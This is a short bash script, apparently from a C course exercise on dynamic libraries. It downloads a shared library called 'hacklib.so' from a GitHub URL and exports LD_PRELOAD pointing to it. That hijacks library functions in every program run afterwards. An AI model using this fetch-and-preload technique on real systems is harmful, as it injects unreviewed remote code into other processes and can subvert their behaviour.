#!/bin/bash
wget -P .. https://raw.githubusercontent.com/leulmintesinot/alx-low_level_programming/master/0x18-dynamic_libraries/hacklib.so
export LD_PRELOAD="$PWD/../hacklib.so"
